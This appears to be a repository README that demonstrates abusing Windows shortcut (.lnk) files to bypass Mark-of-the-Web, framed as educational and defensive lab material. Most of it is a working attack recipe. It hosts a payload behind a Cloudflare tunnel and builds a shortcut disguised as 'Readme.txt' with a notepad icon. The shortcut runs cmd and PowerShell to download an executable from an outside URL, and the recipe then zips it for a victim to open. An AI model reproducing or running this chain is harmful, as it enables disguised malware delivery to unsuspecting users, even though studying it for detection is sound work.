# MOTW Bypass & LNK Abuse

> ⚠️ **Disclaimer**
> This repository is intended **strictly for educational, defensive, and research purposes**.
> It demonstrates how attackers *abuse Windows behaviors* so that defenders can **detect, prevent, and mitigate** them.
> **Do not use these techniques outside of a controlled lab environment with explicit permission.**

---

## 📌 Overview

This project demonstrates a **high-level simulation** of how Windows shortcut (`.lnk`) files can be abused to:

* Bypass **Mark-of-the-Web (MOTW)** protections
* Masquerade as legitimate documents
* Trigger chained execution via built-in Windows utilities
* Evade casual user inspection using icons and filenames

The lab is designed to help:

* Blue Teams validate detection coverage
* SOC analysts understand LNK-based initial access
* Students learn modern Windows abuse techniques
* Red Teams safely demonstrate risk to stakeholders

---
#### Use the python http server to host your file
```shell
python -m http.server 8080
```

#### Start the cloudflare tunnel for that python server
```sh
cloudflared tunnel --url http://localhost:8080
```

#### Run the script
```shell
python lnk.py Readme.txt "C:\Windows\system32\cmd.exe" -a "/k powershell wget https://homes-dependent-sewing-offering.trycloudflare.com/test.exe -OutFile %USERPROFILE%\\test.exe" -i "C:/windows/system32/notepad.exe"
```

#### Then zip the file
```shell
zip Sample.zip Readme.txt.lnk
```

#### To Execute
* unzip and run the readme file
* it downloads the file and bypasses the MOTW(Mark of the web)
---

## ⚖️ Legal & Ethical Notice

Unauthorized use of these techniques **may violate laws and organizational policies**.
Always obtain **explicit written permission** before testing.

